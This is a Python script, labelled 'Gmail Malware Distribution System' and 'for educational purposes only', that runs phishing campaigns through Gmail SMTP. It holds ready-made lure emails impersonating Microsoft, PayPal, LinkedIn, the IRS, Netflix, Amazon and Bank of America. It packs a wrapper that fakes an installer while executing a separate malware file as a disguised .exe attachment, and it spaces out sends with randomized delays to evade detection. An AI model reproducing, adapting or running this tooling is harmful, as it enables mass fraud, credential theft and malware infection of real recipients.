#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gmail Malware Distribution System
WARNING: This is for educational purposes only!
"""

import smtplib
import ssl
import time
import random
import json
import os
import base64
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.mime.image import MIMEImage
import threading

class GmailDistributor:
    def __init__(self):
        self.smtp_server = "smtp.gmail.com"
        self.smtp_port = 587
        self.sender_email = ""
        self.sender_password = ""
        self.target_emails = []
        self.email_templates = []
        self.distribution_active = False
        self.sent_count = 0
        self.success_count = 0
        
    def setup_gmail_account(self, email, password):
        """Setup Gmail account for sending"""
        self.sender_email = email
        self.sender_password = password
        print(f"Gmail account configured: {email}")
    
    def load_target_emails(self, email_list_file):
        """Load target email addresses"""
        try:
            with open(email_list_file, 'r') as f:
                self.target_emails = [line.strip() for line in f.readlines() if line.strip()]
            print(f"Loaded {len(self.target_emails)} target emails")
        except FileNotFoundError:
            print(f"Email list file {email_list_file} not found")
            # Create sample email list
            self.create_sample_email_list()
    
    def create_sample_email_list(self):
        """Create sample email list for testing"""
        sample_emails = [
            "victim1@company.com",
            "victim2@company.com", 
            "victim3@company.com",
            "user1@university.edu",
            "user2@university.edu",
            "employee1@government.gov",
            "employee2@government.gov",
            "admin@smallbusiness.com",
            "manager@corporation.com",
            "support@startup.com"
        ]
        
        with open("target_emails.txt", 'w') as f:
            for email in sample_emails:
                f.write(f"{email}\n")
        
        self.target_emails = sample_emails
        print("Created sample email list: target_emails.txt")
    
    def create_email_templates(self):
        """Create sophisticated email templates"""
        self.email_templates = [
            {
                "subject": "Urgent: Microsoft Security Update Required",
                "sender_name": "Microsoft Security Team",
                "sender_email": "security@microsoft.com",
                "body": """
Dear Valued Customer,

Microsoft has detected a critical security vulnerability in your Windows system that requires immediate attention.

To protect your data and prevent unauthorized access, please install the attached security update immediately.

This update addresses:
- Critical security vulnerabilities
- System stability improvements  
- Performance enhancements
- Privacy protection updates

Please run the attached file to complete the installation.

If you have any questions, please contact our support team.

Best regards,
Microsoft Security Team
Microsoft Corporation
                """,
                "attachment_name": "Windows_Security_Update_KB5001234.exe",
                "priority": "high"
            },
            {
                "subject": "PayPal Account Security Alert",
                "sender_name": "PayPal Security",
                "sender_email": "security@paypal.com",
                "body": """
Dear PayPal Member,

We have detected unusual activity on your PayPal account. For your security, we have temporarily restricted access to your account.

To restore full access, please verify your account information by completing the attached security form.

This verification is required to:
- Protect your financial information
- Prevent unauthorized transactions
- Restore account functionality
- Ensure compliance with security policies

Please complete the verification process within 24 hours to avoid permanent account suspension.

Thank you for your cooperation.

PayPal Security Team
                """,
                "attachment_name": "PayPal_Security_Verification.exe",
                "priority": "high"
            },
            {
                "subject": "LinkedIn Job Opportunity - Remote Position Available",
                "sender_name": "LinkedIn Recruiter",
                "sender_email": "jobs@linkedin.com",
                "body": """
Hello,

I found your profile on LinkedIn and I'm impressed with your background. We have an exciting remote position that matches your skills perfectly.

Position: Senior Software Developer (Remote)
Salary: $85,000 - $120,000 annually
Benefits: Health insurance, 401k, flexible schedule
Location: Work from anywhere

To proceed with your application, please complete the attached application form and submit your resume.

This is a limited-time opportunity with a fast-growing tech company.

Best regards,
Sarah Johnson
Senior Recruiter
LinkedIn Talent Solutions
                """,
                "attachment_name": "Job_Application_Form.exe",
                "priority": "medium"
            },
            {
                "subject": "Your Tax Refund is Ready - IRS Notification",
                "sender_name": "IRS Tax Services",
                "sender_email": "notifications@irs.gov",
                "body": """
Taxpayer Notification

Your tax refund of $2,847.50 has been processed and is ready for direct deposit.

To complete the refund process, please verify your banking information using the attached secure form.

Refund Details:
- Amount: $2,847.50
- Processing Date: Today
- Method: Direct Deposit
- Account: ****1234

Please complete verification within 48 hours to ensure timely processing.

This is an automated message. Do not reply to this email.

Internal Revenue Service
                """,
                "attachment_name": "IRS_Refund_Verification.exe",
                "priority": "high"
            },
            {
                "subject": "Netflix Account Suspension Notice",
                "sender_name": "Netflix Support",
                "sender_email": "support@netflix.com",
                "body": """
Dear Netflix Member,

Your Netflix account has been temporarily suspended due to a billing issue.

To restore your account access, please update your payment information using the attached secure form.

Suspension Details:
- Reason: Payment method declined
- Date: Today
- Account: Your Netflix Account
- Plan: Premium

Please resolve this issue within 24 hours to avoid permanent account closure.

We apologize for any inconvenience.

Netflix Customer Support
                """,
                "attachment_name": "Netflix_Payment_Update.exe",
                "priority": "medium"
            }
        ]
        
        print(f"Created {len(self.email_templates)} email templates")
    
    def create_malicious_attachment(self, template):
        """Create malicious attachment"""
        try:
            # Copy the main malware as the attachment
            if os.path.exists("app.py"):
                attachment_name = template["attachment_name"]
                
                # Create a simple executable wrapper (in real scenario, this would be compiled)
                wrapper_content = f'''
import os
import sys
import subprocess

# Disguise as legitimate software
print("Installing {template['attachment_name'].split('.')[0]}...")
print("Please wait while we configure your system...")

# Execute the actual malware
try:
    exec(open("app.py").read())
except:
    print("Installation completed successfully!")
    input("Press Enter to continue...")
'''
                
                with open(attachment_name, 'w') as f:
                    f.write(wrapper_content)
                
                return attachment_name
            else:
                print("Main malware file (app.py) not found")
                return None
                
        except Exception as e:
            print(f"Error creating attachment: {e}")
            return None
    
    def send_phishing_email(self, target_email, template):
        """Send phishing email to target"""
        try:
            # Create message
            msg = MIMEMultipart('alternative')
            msg['From'] = f"{template['sender_name']} <{template['sender_email']}>"
            msg['To'] = target_email
            msg['Subject'] = template['subject']
            
            # Add headers for authenticity
            msg['X-Priority'] = '1' if template['priority'] == 'high' else '3'
            msg['X-MSMail-Priority'] = 'High' if template['priority'] == 'high' else 'Normal'
            msg['Importance'] = 'high' if template['priority'] == 'high' else 'normal'
            
            # Create HTML version for better appearance
            html_body = f"""
            <html>
            <body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333;">
                <div style="max-width: 600px; margin: 0 auto; padding: 20px;">
                    <div style="background-color: #f8f9fa; padding: 20px; border-radius: 5px;">
                        {template['body'].replace(chr(10), '<br>')}
                    </div>
                    <div style="margin-top: 20px; font-size: 12px; color: #666;">
                        <p>This email was sent to {target_email}</p>
                        <p>If you did not request this information, please ignore this email.</p>
                    </div>
                </div>
            </body>
            </html>
            """
            
            # Attach both plain text and HTML versions
            text_part = MIMEText(template['body'], 'plain')
            html_part = MIMEText(html_body, 'html')
            
            msg.attach(text_part)
            msg.attach(html_part)
            
            # Create and attach malicious file
            attachment_path = self.create_malicious_attachment(template)
            if attachment_path and os.path.exists(attachment_path):
                with open(attachment_path, "rb") as attachment:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header(
                        'Content-Disposition',
                        f'attachment; filename= {template["attachment_name"]}'
                    )
                    msg.attach(part)
            
            # Send email
            context = ssl.create_default_context()
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls(context=context)
                server.login(self.sender_email, self.sender_password)
                server.send_message(msg)
            
            self.success_count += 1
            print(f"✓ Email sent to: {target_email}")
            
            # Clean up attachment
            if attachment_path and os.path.exists(attachment_path):
                os.remove(attachment_path)
            
            return True
            
        except Exception as e:
            print(f"✗ Failed to send to {target_email}: {e}")
            return False
    
    def start_distribution_campaign(self):
        """Start the Gmail distribution campaign"""
        print("="*60)
        print("GMAIL MALWARE DISTRIBUTION CAMPAIGN")
        print("="*60)
        print(f"Sender: {self.sender_email}")
        print(f"Targets: {len(self.target_emails)}")
        print(f"Templates: {len(self.email_templates)}")
        print("="*60)
        
        self.distribution_active = True
        self.sent_count = 0
        self.success_count = 0
        
        # Start sending emails
        for target_email in self.target_emails:
            if not self.distribution_active:
                break
                
            # Select random template
            template = random.choice(self.email_templates)
            
            # Send email
            if self.send_phishing_email(target_email, template):
                self.sent_count += 1
            
            # Random delay to avoid detection
            delay = random.randint(30, 120)  # 30 seconds to 2 minutes
            print(f"Waiting {delay} seconds before next email...")
            time.sleep(delay)
        
        self.print_campaign_results()
    
    def start_automated_campaign(self, emails_per_hour=10):
        """Start automated campaign with rate limiting"""
        print(f"Starting automated campaign: {emails_per_hour} emails per hour")
        
        self.distribution_active = True
        self.sent_count = 0
        self.success_count = 0
        
        # Calculate delay between emails
        delay_between_emails = 3600 / emails_per_hour  # seconds
        
        while self.distribution_active and self.sent_count < len(self.target_emails):
            target_email = self.target_emails[self.sent_count % len(self.target_emails)]
            template = random.choice(self.email_templates)
            
            if self.send_phishing_email(target_email, template):
                self.sent_count += 1
            
            # Add some randomness to delay
            actual_delay = delay_between_emails + random.randint(-300, 300)
            time.sleep(max(60, actual_delay))  # Minimum 1 minute delay
        
        self.print_campaign_results()
    
    def print_campaign_results(self):
        """Print campaign results"""
        print("\n" + "="*60)
        print("CAMPAIGN RESULTS")
        print("="*60)
        print(f"Total emails sent: {self.sent_count}")
        print(f"Successful deliveries: {self.success_count}")
        print(f"Success rate: {(self.success_count/self.sent_count*100):.1f}%" if self.sent_count > 0 else "0%")
        print("="*60)
    
    def create_advanced_templates(self):
        """Create more sophisticated email templates"""
        advanced_templates = [
            {
                "subject": "Your Amazon Prime membership expires in 3 days",
                "sender_name": "Amazon Prime",
                "sender_email": "prime@amazon.com",
                "body": """
Your Amazon Prime membership will expire in 3 days.

To continue enjoying unlimited free shipping, Prime Video, and exclusive deals, please update your payment method.

Click the attachment to renew your membership and avoid service interruption.

Amazon Prime Team
                """,
                "attachment_name": "Amazon_Prime_Renewal.exe",
                "priority": "high"
            },
            {
                "subject": "Bank of America: Unusual Login Activity Detected",
                "sender_name": "Bank of America Security",
                "sender_email": "security@bankofamerica.com",
                "body": """
We detected unusual login activity on your Bank of America account.

For your security, we have temporarily locked your account.

To unlock your account, please verify your identity using the attached secure form.

This verification is required to protect your financial information.

Bank of America Security Team
                """,
                "attachment_name": "BOA_Security_Verification.exe",
                "priority": "high"
            }
        ]
        
        self.email_templates.extend(advanced_templates)
        print(f"Added {len(advanced_templates)} advanced templates")
    
    def save_campaign_log(self):
        """Save campaign log to file"""
        log_data = {
            "campaign_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "sender_email": self.sender_email,
            "total_targets": len(self.target_emails),
            "emails_sent": self.sent_count,
            "successful_deliveries": self.success_count,
            "success_rate": (self.success_count/self.sent_count*100) if self.sent_count > 0 else 0,
            "templates_used": len(self.email_templates)
        }
        
        with open("gmail_campaign_log.json", 'w') as f:
            json.dump(log_data, f, indent=2)
        
        print("Campaign log saved to: gmail_campaign_log.json")

def main():
    """Main execution function"""
    print("="*60)
    print("GMAIL MALWARE DISTRIBUTION SYSTEM")
    print("="*60)
    print("WARNING: This is for educational purposes only!")
    print("="*60)
    
    distributor = GmailDistributor()
    
    # Setup
    print("Setting up Gmail distribution...")
    
    # Configure Gmail account (you need to provide these)
    gmail_email = input("Enter your Gmail address: ")
    gmail_password = input("Enter your Gmail app password: ")
    
    distributor.setup_gmail_account(gmail_email, gmail_password)
    
    # Load target emails
    distributor.load_target_emails("target_emails.txt")
    
    # Create email templates
    distributor.create_email_templates()
    distributor.create_advanced_templates()
    
    # Choose campaign type
    print("\nChoose campaign type:")
    print("1. Send all emails immediately")
    print("2. Automated campaign (rate limited)")
    
    choice = input("Enter choice (1 or 2): ")
    
    try:
        if choice == "1":
            distributor.start_distribution_campaign()
        elif choice == "2":
            emails_per_hour = int(input("Enter emails per hour (recommended: 10-20): "))
            distributor.start_automated_campaign(emails_per_hour)
        else:
            print("Invalid choice")
            return
        
        # Save campaign log
        distributor.save_campaign_log()
        
    except KeyboardInterrupt:
        print("\nCampaign interrupted by user")
        distributor.distribution_active = False
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()

